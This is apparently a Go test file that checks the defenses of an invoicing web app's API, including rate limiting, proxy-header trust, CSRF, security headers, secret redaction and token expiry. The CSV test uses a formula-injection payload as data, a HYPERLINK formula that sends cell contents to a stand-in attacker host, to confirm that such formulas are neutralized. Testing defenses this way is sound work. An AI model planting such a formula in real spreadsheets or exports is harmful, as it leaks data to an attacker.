package api_test

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"net/netip"
	"strings"
	"testing"
	"time"

	"github.com/qwerin/nanofaktura/internal/api"
	"github.com/qwerin/nanofaktura/internal/auth"
	"github.com/qwerin/nanofaktura/internal/config"
	"github.com/qwerin/nanofaktura/internal/model"
	"github.com/qwerin/nanofaktura/internal/webhooks"
)

// withRateLimit turns the rate limits on (newTestServer disables them).
func withRateLimit(c *config.Config) { c.DisableRateLimit = false }

// raw sends a request built by the caller (custom headers) as c.
func (c *client) raw(req *http.Request) (*http.Response, []byte) {
	c.ts.t.Helper()
	if c.session != "" {
		req.AddCookie(&http.Cookie{Name: auth.SessionCookie, Value: c.session})
	}
	if c.token != "" {
		req.Header.Set("Authorization", "Bearer "+c.token)
	}
	rec := httptest.NewRecorder()
	c.ts.handler.ServeHTTP(rec, req)
	return rec.Result(), rec.Body.Bytes()
}

func jsonReq(method, path string, body any, headers ...string) *http.Request {
	var r io.Reader
	if body != nil {
		b, _ := json.Marshal(body)
		r = bytes.NewReader(b)
	}
	req := httptest.NewRequest(method, path, r)
	if body != nil {
		req.Header.Set("Content-Type", "application/json")
	}
	for i := 0; i+1 < len(headers); i += 2 {
		req.Header.Set(headers[i], headers[i+1])
	}
	return req
}

func assertRateLimited(t *testing.T, res *http.Response, body []byte) {
	t.Helper()
	assertCode(t, res, body, http.StatusTooManyRequests, api.CodeRateLimited)
	if res.Header.Get("Retry-After") == "" {
		t.Fatalf("no Retry-After: %v", res.Header)
	}
}

func TestLoginRateLimit(t *testing.T) {
	ts := newTestServer(t, withRateLimit)
	ts.signup("a@example.cz", "Firma A")
	anon := ts.anon()
	bad := api.LoginRequest{Email: "a@example.cz", Password: "spatne-heslo"}
	for range 5 {
		res, body := anon.do("POST", "/api/auth/login", bad)
		assertError(t, res, body, http.StatusUnauthorized, "invalid email or password")
	}
	res, body := anon.do("POST", "/api/auth/login", bad)
	assertRateLimited(t, res, body)
	// the e-mail is locked even for the right password …
	res, body = anon.do("POST", "/api/auth/login", api.LoginRequest{Email: "A@example.cz", Password: testPassword})
	assertRateLimited(t, res, body)
	// … and a spoofed X-Forwarded-For from an untrusted peer changes nothing
	res, body = anon.raw(jsonReq("POST", "/api/auth/login", api.LoginRequest{Email: "a@example.cz", Password: testPassword},
		"X-Forwarded-For", "203.0.113.9"))
	assertRateLimited(t, res, body)

	// per IP: 20 attempts at once, whatever the e-mail
	ts2 := newTestServer(t, withRateLimit)
	anon = ts2.anon()
	for i := range 20 {
		res, body := anon.do("POST", "/api/auth/login", api.LoginRequest{Email: fmt.Sprintf("u%d@example.cz", i), Password: "x"})
		assertError(t, res, body, http.StatusUnauthorized, "invalid")
	}
	res, body = anon.do("POST", "/api/auth/login", api.LoginRequest{Email: "other@example.cz", Password: "x"})
	assertRateLimited(t, res, body)
	res, body = anon.raw(jsonReq("POST", "/api/auth/login", api.LoginRequest{Email: "other@example.cz", Password: "x"},
		"X-Forwarded-For", "203.0.113.9"))
	assertRateLimited(t, res, body)
}

// Behind a trusted proxy the client IP comes from X-Forwarded-For.
func TestRateLimitTrustedProxy(t *testing.T) {
	ts := newTestServer(t, withRateLimit, func(c *config.Config) {
		c.TrustedProxies = []netip.Prefix{netip.MustParsePrefix("192.0.2.0/24")} // httptest RemoteAddr 192.0.2.1
	})
	anon := ts.anon()
	for i := range 21 {
		res, body := anon.raw(jsonReq("POST", "/api/auth/login", api.LoginRequest{Email: fmt.Sprintf("u%d@example.cz", i), Password: "x"},
			"X-Forwarded-For", fmt.Sprintf("198.51.100.%d, 192.0.2.7", i)))
		assertError(t, res, body, http.StatusUnauthorized, "invalid") // each client has its own bucket
	}
	for range 20 {
		anon.raw(jsonReq("POST", "/api/auth/login", api.LoginRequest{Email: "x@example.cz", Password: "x"}, "X-Forwarded-For", "198.51.100.200"))
	}
	res, body := anon.raw(jsonReq("POST", "/api/auth/login", api.LoginRequest{Email: "y@example.cz", Password: "x"}, "X-Forwarded-For", "198.51.100.200"))
	assertRateLimited(t, res, body)
}

func TestRegisterAndPublicRateLimits(t *testing.T) {
	ts := newTestServer(t, withRateLimit)
	for i := range 5 {
		ts.signup(fmt.Sprintf("u%d@example.cz", i), "Firma")
	}
	res, body := ts.anon().do("POST", "/api/auth/register", api.RegisterRequest{
		Email: "u9@example.cz", Name: "X", Password: testPassword, AccountName: "X"})
	assertRateLimited(t, res, body)

	anon := ts.anon()
	for range 60 {
		anon.do("GET", "/api/public/invoices/unknown-token-unknown-token-00", nil)
	}
	res, body = anon.do("GET", "/api/public/invoices/unknown-token-unknown-token-00/pdf", nil)
	assertRateLimited(t, res, body)

	for range 20 {
		anon.do("GET", "/api/invitations/unknown", nil)
	}
	res, body = anon.do("GET", "/api/invitations/unknown", nil)
	assertRateLimited(t, res, body)
}

func TestPasswordChangeRateLimitAndTokenRevocation(t *testing.T) {
	ts := newTestServer(t, withRateLimit)
	a := ts.signup("a@example.cz", "Firma A")
	tok := doJSON[api.CreatedAPIToken](a, http.StatusCreated, "POST", "/api/auth/tokens", api.APITokenCreate{Name: "skript"})
	bearer := &client{ts: ts, token: tok.Token}
	bearer.mustDo(http.StatusOK, "GET", "/api/auth/me", nil)

	newPw := "nove-heslo-123"
	wrong := "spatne-heslo"
	for range 5 {
		res, body := a.do("PATCH", "/api/auth/me", api.MePatch{Password: &newPw, CurrentPassword: &wrong})
		assertCode(t, res, body, http.StatusUnprocessableEntity, api.CodeWrongPassword)
	}
	pw := testPassword
	res, body := a.do("PATCH", "/api/auth/me", api.MePatch{Password: &newPw, CurrentPassword: &pw})
	assertRateLimited(t, res, body)

	ts2 := newTestServer(t)
	b := ts2.signup("b@example.cz", "Firma B")
	tok = doJSON[api.CreatedAPIToken](b, http.StatusCreated, "POST", "/api/auth/tokens", api.APITokenCreate{Name: "skript"})
	bearer = &client{ts: ts2, token: tok.Token}
	b.mustDo(http.StatusOK, "PATCH", "/api/auth/me", api.MePatch{Password: &newPw, CurrentPassword: &pw})
	res, body = bearer.do("GET", "/api/auth/me", nil)
	assertError(t, res, body, http.StatusUnauthorized, "authentication required") // revoked by the password change
	b.mustDo(http.StatusOK, "GET", "/api/auth/me", nil)                           // the current session stays
}

// bcrypt reads at most 72 bytes: longer passwords are a 422, not a 500.
func TestPasswordByteLimit(t *testing.T) {
	ts := newTestServer(t)
	long := strings.Repeat("ř", 40) // 40 characters, 80 bytes
	res, body := ts.anon().do("POST", "/api/auth/register", api.RegisterRequest{Email: "a@example.cz", Name: "A", Password: long, AccountName: "A"})
	assertCode(t, res, body, http.StatusUnprocessableEntity, api.CodePasswordTooLong)
	a := ts.signup("a@example.cz", "Firma A")
	pw := testPassword
	res, body = a.do("PATCH", "/api/auth/me", api.MePatch{Password: &long, CurrentPassword: &pw})
	assertCode(t, res, body, http.StatusUnprocessableEntity, api.CodePasswordTooLong)
}

func TestSetupToken(t *testing.T) {
	ts := newTestServer(t, func(c *config.Config) { c.SetupToken = "tajny-setup"; c.AllowSignup = true })
	anon := ts.anon()
	st := doJSON[api.AuthStatus](anon, http.StatusOK, "GET", "/api/auth/status", nil)
	if !st.SetupTokenRequired || st.HasUsers {
		t.Fatalf("status: %+v", st)
	}
	req := api.RegisterRequest{Email: "a@example.cz", Name: "A", Password: testPassword, AccountName: "A"}
	res, body := anon.do("POST", "/api/auth/register", req)
	assertCode(t, res, body, http.StatusForbidden, api.CodeSetupToken)
	req.SetupToken = "spatny"
	res, body = anon.do("POST", "/api/auth/register", req)
	assertCode(t, res, body, http.StatusForbidden, api.CodeSetupToken)
	req.SetupToken = "tajny-setup"
	anon.mustDo(http.StatusCreated, "POST", "/api/auth/register", req)
	if st := doJSON[api.AuthStatus](anon, http.StatusOK, "GET", "/api/auth/status", nil); st.SetupTokenRequired {
		t.Fatalf("after first user: %+v", st)
	}
	ts.signup("b@example.cz", "Firma B") // later signups (ALLOW_SIGNUP) need no token
}

func TestSecureCookieAndHSTS(t *testing.T) {
	login := func(ts *testServer, headers ...string) *http.Response {
		t.Helper()
		ts.signup(fmt.Sprintf("u%d@example.cz", len(headers)), "Firma")
		res, body := ts.anon().raw(jsonReq("POST", "/api/auth/login",
			api.LoginRequest{Email: fmt.Sprintf("u%d@example.cz", len(headers)), Password: testPassword}, headers...))
		if res.StatusCode != http.StatusOK {
			t.Fatalf("login: %d %s", res.StatusCode, body)
		}
		return res
	}
	secure := func(res *http.Response) bool {
		for _, c := range res.Cookies() {
			if c.Name == auth.SessionCookie {
				return c.Secure
			}
		}
		t.Fatal("no session cookie")
		return false
	}
	// plain http, no https public URL: not Secure, no HSTS
	res := login(newTestServer(t))
	if secure(res) || res.Header.Get("Strict-Transport-Security") != "" {
		t.Fatalf("http: %v", res.Header)
	}
	// https public URL → Secure + HSTS automatically
	res = login(newTestServer(t, func(c *config.Config) { c.PublicURL = "https://faktury.example.cz" }))
	if !secure(res) || !strings.Contains(res.Header.Get("Strict-Transport-Security"), "max-age=") {
		t.Fatalf("https public url: %v", res.Header)
	}
	// explicitly disabled
	off := false
	res = login(newTestServer(t, func(c *config.Config) { c.PublicURL = "https://faktury.example.cz"; c.SecureCookies = &off }))
	if secure(res) {
		t.Fatal("secure cookies explicitly disabled")
	}
	// X-Forwarded-Proto counts only from a trusted proxy
	res = login(newTestServer(t), "X-Forwarded-Proto", "https")
	if secure(res) {
		t.Fatal("untrusted X-Forwarded-Proto honoured")
	}
	res = login(newTestServer(t, func(c *config.Config) {
		c.TrustedProxies = []netip.Prefix{netip.MustParsePrefix("192.0.2.1/32")}
	}), "X-Forwarded-Proto", "https")
	if !secure(res) || res.Header.Get("Strict-Transport-Security") == "" {
		t.Fatalf("trusted proxy https: %v", res.Header)
	}
}

func TestSecurityHeaders(t *testing.T) {
	ts := newTestServer(t)
	res, _ := ts.anon().do("GET", "/api/auth/status", nil)
	for h, want := range map[string]string{
		"X-Content-Type-Options":  "nosniff",
		"Content-Security-Policy": "frame-ancestors 'self'",
		"X-Frame-Options":         "SAMEORIGIN",
		"Referrer-Policy":         "no-referrer",
	} {
		if got := res.Header.Get(h); got != want {
			t.Fatalf("%s = %q, want %q", h, got, want)
		}
	}
	if !strings.Contains(res.Header.Get("Permissions-Policy"), "camera=()") {
		t.Fatalf("permissions policy: %q", res.Header.Get("Permissions-Policy"))
	}
	res, _ = ts.anon().do("GET", "/api/public/invoices/unknown-token-unknown-token-00", nil)
	if res.Header.Get("Cache-Control") != "private, no-store" {
		t.Fatalf("public cache-control: %q", res.Header.Get("Cache-Control"))
	}
	ts.anon().mustDo(http.StatusOK, "GET", "/api/openapi.json", nil)
	hidden := newTestServer(t, func(c *config.Config) { c.DisableAPIDocs = true })
	hidden.anon().mustDo(http.StatusNotFound, "GET", "/api/openapi.json", nil)
	hidden.anon().mustDo(http.StatusNotFound, "GET", "/api/docs", nil)
}

func TestCSRF(t *testing.T) {
	ts := newTestServer(t)
	a := ts.signup("a@example.cz", "Firma A")
	body := api.SubjectCreate{Name: "ACME"}

	// cross-site browser requests with the session cookie are refused
	res, b := a.raw(jsonReq("POST", a.acct("/subjects"), body, "Sec-Fetch-Site", "cross-site"))
	assertCode(t, res, b, http.StatusForbidden, api.CodeCrossOrigin)
	res, b = a.raw(jsonReq("POST", a.acct("/subjects"), body, "Sec-Fetch-Site", "same-site"))
	assertCode(t, res, b, http.StatusForbidden, api.CodeCrossOrigin)
	res, b = a.raw(jsonReq("POST", a.acct("/subjects"), body, "Origin", "https://evil.example"))
	assertCode(t, res, b, http.StatusForbidden, api.CodeCrossOrigin)
	// multipart too
	req := httptest.NewRequest("POST", a.acct("/attachments"), strings.NewReader("--x--"))
	req.Header.Set("Content-Type", "multipart/form-data; boundary=x")
	req.Header.Set("Sec-Fetch-Site", "cross-site")
	res, b = a.raw(req)
	assertCode(t, res, b, http.StatusForbidden, api.CodeCrossOrigin)
	// a body without Content-Type is not parsed as JSON
	req = httptest.NewRequest("POST", a.acct("/subjects"), strings.NewReader(`{"name":"X"}`))
	res, b = a.raw(req)
	assertCode(t, res, b, http.StatusUnsupportedMediaType, "unsupported_media_type")
	req = httptest.NewRequest("POST", a.acct("/subjects"), strings.NewReader(`{"name":"X"}`))
	req.Header.Set("Content-Type", "text/plain")
	res, b = a.raw(req)
	assertCode(t, res, b, http.StatusUnsupportedMediaType, "unsupported_media_type")

	// same-origin browser requests and non-browser clients work
	a.mustDo(http.StatusCreated, "POST", a.acct("/subjects"), body)
	res, b = a.raw(jsonReq("POST", a.acct("/subjects"), api.SubjectCreate{Name: "B"}, "Sec-Fetch-Site", "same-origin"))
	if res.StatusCode != http.StatusCreated {
		t.Fatalf("same-origin: %d %s", res.StatusCode, b)
	}
	// API tokens are exempt (a browser cannot attach them cross-site)
	tok := doJSON[api.CreatedAPIToken](a, http.StatusCreated, "POST", "/api/auth/tokens", api.APITokenCreate{Name: "ci"})
	bearer := &client{ts: ts, token: tok.Token, slug: a.slug}
	res, b = bearer.raw(jsonReq("POST", a.acct("/subjects"), api.SubjectCreate{Name: "C"}, "Sec-Fetch-Site", "cross-site"))
	if res.StatusCode != http.StatusCreated {
		t.Fatalf("bearer: %d %s", res.StatusCode, b)
	}
}

// User-triggered e-mails: at most 10 recipients and 50 per account and hour.
func TestEmailAbuseLimits(t *testing.T) {
	ts := newTestServer(t, withRateLimit)
	a := ts.signup("a@example.cz", "Firma A")
	subj := newSubject(a, api.SubjectCreate{Name: "ACME", Email: "acme@example.cz"})
	inv := createInv(a, api.InvoiceCreate{SubjectID: new(subj.ID), Lines: []api.InvoiceLineInput{line("Práce", "1", 1000, nil)}})
	noPDF := false
	many := make([]string, 11)
	for i := range many {
		many[i] = fmt.Sprintf("r%d@example.cz", i)
	}
	res, body := a.do("POST", invURL(a, inv.ID, "/send"), api.InvoiceSend{To: many[:6], Cc: many[6:], AttachPDF: &noPDF})
	assertError(t, res, body, http.StatusUnprocessableEntity, "at most 10 recipients")
	for range 50 {
		a.mustDo(http.StatusOK, "POST", invURL(a, inv.ID, "/send"), api.InvoiceSend{AttachPDF: &noPDF})
	}
	res, body = a.do("POST", invURL(a, inv.ID, "/send"), api.InvoiceSend{AttachPDF: &noPDF})
	assertRateLimited(t, res, body)
	res, body = a.do("POST", a.acct("/members/invite"), api.InvitationCreate{Email: "x@example.cz", Role: "member"})
	assertRateLimited(t, res, body)
}

func TestExportRateLimit(t *testing.T) {
	ts := newTestServer(t, withRateLimit)
	a := ts.signup("a@example.cz", "Firma A")
	for range 10 {
		a.mustDo(http.StatusOK, "GET", a.acct("/exports/pdf.zip"), nil)
	}
	res, body := a.do("GET", a.acct("/backup"), nil)
	assertRateLimited(t, res, body)
}

// Webhook URLs (often with a secret token) never end up in events, and
// webhook events are hidden from roles that cannot manage webhooks.
func TestWebhookURLNotInEvents(t *testing.T) {
	ts := newTestServer(t)
	a := ts.signup("a@example.cz", "Firma A")
	member := ts.memberOf(a, "m@example.cz", "member")
	rcv := newHookReceiver(t)
	rcv.setStatus(http.StatusServiceUnavailable)
	secretURL := rcv.URL + "/hooks/TAJNY-KLIC?token=TAJNY-TOKEN"
	doJSON[api.Webhook](a, http.StatusCreated, "POST", a.acct("/webhooks"), api.WebhookCreate{URL: secretURL})
	// connection errors must not quote the URL either
	doJSON[api.Webhook](a, http.StatusCreated, "POST", a.acct("/webhooks"), api.WebhookCreate{URL: "http://127.0.0.1:1/x/TAJNY-KLIC2"})
	newSubject(a, api.SubjectCreate{Name: "ACME"})
	mustRunJob(ts, "webhooks")
	for _, d := range webhooks.RetryDelays {
		ts.now = ts.now.Add(d)
		mustRunJob(ts, "webhooks")
	}
	var evs []model.Event
	ts.db.Where("name LIKE ?", "webhook.%").Find(&evs)
	if len(evs) == 0 {
		t.Fatal("no webhook.failed event")
	}
	for _, e := range evs {
		if b, _ := json.Marshal(e); strings.Contains(string(b), "TAJNY") {
			t.Fatalf("secret in event: %s", b)
		}
	}
	if n := listEvents(a, "?name=webhook.failed").Total; n != 2 {
		t.Fatalf("owner sees %d webhook events", n)
	}
	if n := listEvents(member, "?name=webhook.failed").Total; n != 0 {
		t.Fatalf("member sees %d webhook events", n)
	}
}

// Text cells of CSV exports cannot smuggle spreadsheet formulas.
func TestCSVFormulaInjection(t *testing.T) {
	ts := newTestServer(t)
	a := ts.signup("a@example.cz", "Firma A")
	for _, name := range []string{`=HYPERLINK("https://evil.example/?d="&A2;"klik")`, "+1+2", "-3", "@SUM(A1)"} {
		newSubject(a, api.SubjectCreate{Name: name})
	}
	recs := csvOf(t, a, a.acct("/exports/subjects.csv"))
	c := col(t, recs[0], "Název")
	for _, r := range recs[1:] {
		if !strings.HasPrefix(r[c], "'") {
			t.Fatalf("formula not neutralized: %q", r[c])
		}
	}
}

// API tokens may expire; the cleanup job removes expired tokens, sessions
// and long-expired invitations.
func TestAPITokenExpiryAndCleanup(t *testing.T) {
	ts := newTestServer(t)
	a := ts.signup("a@example.cz", "Firma A")
	tok := doJSON[api.CreatedAPIToken](a, http.StatusCreated, "POST", "/api/auth/tokens", api.APITokenCreate{Name: "ci", ExpiresInDays: 2})
	if tok.ExpiresAt == nil || !tok.ExpiresAt.Equal(ts.now.Add(48*time.Hour)) {
		t.Fatalf("expires_at: %+v", tok)
	}
	forever := doJSON[api.CreatedAPIToken](a, http.StatusCreated, "POST", "/api/auth/tokens", api.APITokenCreate{Name: "navždy"})
	bearer := &client{ts: ts, token: tok.Token}
	bearer.mustDo(http.StatusOK, "GET", "/api/auth/me", nil)
	invite(a, "x@example.cz", "member")

	ts.now = ts.now.Add(49 * time.Hour)
	res, body := bearer.do("GET", "/api/auth/me", nil)
	assertError(t, res, body, http.StatusUnauthorized, "authentication required")
	(&client{ts: ts, token: forever.Token}).mustDo(http.StatusOK, "GET", "/api/auth/me", nil)

	ts.now = ts.now.Add(40 * 24 * time.Hour) // session (30 days) and invitation (7 + 7 days) expired
	if err := runJob(ts, "auth-cleanup"); err != nil {
		t.Fatal(err)
	}
	var tokens, sessions, invitations int64
	ts.db.Model(&model.APIToken{}).Count(&tokens)
	ts.db.Model(&model.Session{}).Count(&sessions)
	ts.db.Model(&model.Invitation{}).Count(&invitations)
	if tokens != 1 || sessions != 0 || invitations != 0 {
		t.Fatalf("after cleanup: tokens %d sessions %d invitations %d", tokens, sessions, invitations)
	}
}

// 500 responses carry a generic message, never the internal cause (SQL …);
// validation errors do not echo passwords.
func TestInternalErrorsAreGeneric(t *testing.T) {
	ts := newTestServer(t)
	a := ts.signup("a@example.cz", "Firma A")
	if err := ts.db.Migrator().DropTable("subjects"); err != nil {
		t.Fatal(err)
	}
	res, body := a.do("GET", a.acct("/subjects"), nil)
	assertCode(t, res, body, http.StatusInternalServerError, "internal")
	if strings.Contains(string(body), "subjects") || strings.Contains(string(body), "SQL") || strings.Contains(string(body), "table") {
		t.Fatalf("internal detail leaked: %s", body)
	}

	res, body = ts.anon().do("POST", "/api/auth/register", api.RegisterRequest{Email: "b@example.cz", Name: "B", Password: "Tajne12", AccountName: "B"})
	assertCode(t, res, body, http.StatusUnprocessableEntity, api.CodeValidation)
	if strings.Contains(string(body), "Tajne12") {
		t.Fatalf("password echoed: %s", body)
	}
}
